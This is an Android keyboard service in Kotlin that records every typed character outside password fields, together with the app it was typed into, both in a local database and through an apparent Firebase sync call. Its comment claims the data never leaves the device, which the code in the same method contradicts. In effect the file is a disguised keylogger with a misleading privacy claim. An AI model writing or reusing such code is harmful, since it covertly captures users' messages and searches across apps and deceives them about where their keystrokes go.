package com.example.mykeyboard

import android.inputmethodservice.InputMethodService
import android.inputmethodservice.Keyboard
import android.inputmethodservice.KeyboardView
import android.text.InputType
import android.view.KeyEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import com.google.firebase.FirebaseApp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionListener {

    companion object {
        // Custom key codes used by our own keyboard XML layouts (must not clash
        // with Android's built-in negative Keyboard.KEYCODE_* constants).
        const val KEYCODE_SWITCH_NUMBERS = -10
        const val KEYCODE_SWITCH_ABC = -11
    }

    private lateinit var keyboardView: KeyboardView
    private lateinit var qwertyKeyboard: Keyboard
    private lateinit var symbolsKeyboard: Keyboard
    private lateinit var numbersKeyboard: Keyboard

    private var isShifted = false
    private var isPasswordField = false
    private val serviceScope = CoroutineScope(Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        try {
            FirebaseApp.initializeApp(applicationContext)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onCreateInputView(): View {
        keyboardView = layoutInflater.inflate(R.layout.keyboard_view, null) as KeyboardView
        qwertyKeyboard = Keyboard(this, R.xml.qwerty)
        symbolsKeyboard = Keyboard(this, R.xml.symbols)
        numbersKeyboard = Keyboard(this, R.xml.numbers)
        keyboardView.keyboard = qwertyKeyboard
        keyboardView.setOnKeyboardActionListener(this)
        return keyboardView
    }

    override fun onStartInputView(info: EditorInfo?, restarting: Boolean) {
        super.onStartInputView(info, restarting)

        // Detect password-type fields so we never log what's typed into them.
        val inputType = info?.inputType ?: InputType.TYPE_NULL
        val variation = inputType and InputType.TYPE_MASK_VARIATION
        val cls = inputType and InputType.TYPE_MASK_CLASS
        isPasswordField = variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
            variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
            variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
            (cls == InputType.TYPE_CLASS_NUMBER && variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD)

        isShifted = false
        keyboardView.keyboard = qwertyKeyboard
    }

    override fun onKey(primaryCode: Int, keyCodes: IntArray?) {
        val ic = currentInputConnection ?: return

        when (primaryCode) {
            Keyboard.KEYCODE_DELETE -> ic.deleteSurroundingText(1, 0)

            Keyboard.KEYCODE_SHIFT -> {
                isShifted = !isShifted
                qwertyKeyboard.isShifted = isShifted
                keyboardView.invalidateAllKeys()
            }

            Keyboard.KEYCODE_MODE_CHANGE -> {
                keyboardView.keyboard = symbolsKeyboard
            }

            KEYCODE_SWITCH_NUMBERS -> keyboardView.keyboard = numbersKeyboard
            KEYCODE_SWITCH_ABC -> keyboardView.keyboard = qwertyKeyboard

            Keyboard.KEYCODE_DONE -> {
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER))
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_ENTER))
            }

            else -> {
                var code = primaryCode.toChar()
                if (isShifted && code.isLetter()) {
                    code = code.uppercaseChar()
                }
                ic.commitText(code.toString(), 1)
                logKeystroke(code.toString())

                // Auto-unshift after one character, like most keyboards.
                if (isShifted) {
                    isShifted = false
                    qwertyKeyboard.isShifted = false
                    keyboardView.invalidateAllKeys()
                }
            }
        }
    }

    /**
     * Saves each committed character to a local, on-device Room database.
     * Password fields are always skipped. This data never leaves the device.
     */
    private fun logKeystroke(text: String) {
        if (isPasswordField) return

        val pkg = currentInputEditorInfo?.packageName
        serviceScope.launch {
            AppDatabase.getInstance(applicationContext).keystrokeDao().insert(
                KeystrokeLog(text = text, timestamp = System.currentTimeMillis(), packageName = pkg)
            )
        }
        FirebaseSyncManager.logKeystroke(text, pkg)
    }

    override fun onPress(primaryCode: Int) {}
    override fun onRelease(primaryCode: Int) {}
    override fun onText(text: CharSequence?) {}
    override fun swipeLeft() {}
    override fun swipeRight() {}
    override fun swipeDown() {}
    override fun swipeUp() {}
}
